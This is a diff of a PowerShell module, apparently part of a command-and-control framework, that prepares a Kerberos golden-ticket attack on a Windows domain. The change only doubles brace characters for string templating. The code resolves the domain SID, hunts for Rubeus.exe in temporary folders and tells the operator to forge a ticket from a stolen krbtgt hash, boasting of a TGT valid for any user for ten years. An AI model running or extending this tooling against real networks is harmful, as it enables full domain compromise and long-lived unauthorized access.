@@ -109,28 +109,28 @@ try {{
     $results += "[*] User: $targetUser"
 
     # Resolve domain SID
-    try {
+    try {{
         $sidObj = New-Object System.Security.Principal.NTAccount($domain, 'Domain Admins')
         $fullSid = $sidObj.Translate([System.Security.Principal.SecurityIdentifier]).Value
         $domainSID = ($fullSid -split '-')[0..($fullSid.Split('-').Length-2)] -join '-'
-    } catch { $domainSID = '' }
+    }} catch {{ $domainSID = '' }}
     $results += "[*] Domain SID: $domainSID"
 
     # Try Rubeus.exe for golden ticket forging + injection
     $rub = $null
-    foreach ($p in @('C:\Windows\Temp\Rubeus.exe','C:\ProgramData\Rubeus.exe','C:\Temp\Rubeus.exe')) {
-        if (Test-Path $p) { $rub = $p; break }
-    }
-    if (-not $rub) { $rub = (Get-Command Rubeus.exe -ErrorAction SilentlyContinue)?.Source }
+    foreach ($p in @('C:\Windows\Temp\Rubeus.exe','C:\ProgramData\Rubeus.exe','C:\Temp\Rubeus.exe')) {{
+        if (Test-Path $p) {{ $rub = $p; break }}
+    }}
+    if (-not $rub) {{ $rub = (Get-Command Rubeus.exe -ErrorAction SilentlyContinue)?.Source }}
 
-    if ($rub -and $domainSID) {
+    if ($rub -and $domainSID) {{
         # Obtain krbtgt hash from reg_save BOF output or secretsdump before calling this
         $results += "[*] Rubeus.exe: $rub — use golden_ticket plugin with krbtgt_hash to forge TGT"
         $results += "[+] Run: golden_ticket ticket_type=golden domain=$domain domain_sid=$domainSID"
-    } else {
+    }} else {{
         $results += '[-] Rubeus.exe not found or domain SID unknown'
         $results += '[*] Upload Rubeus.exe then use the golden_ticket plugin'
-    }
+    }}
 
     $results += '[*] Golden ticket properties:'
     $results += '    ✓ Valid TGT for any user for 10 years'
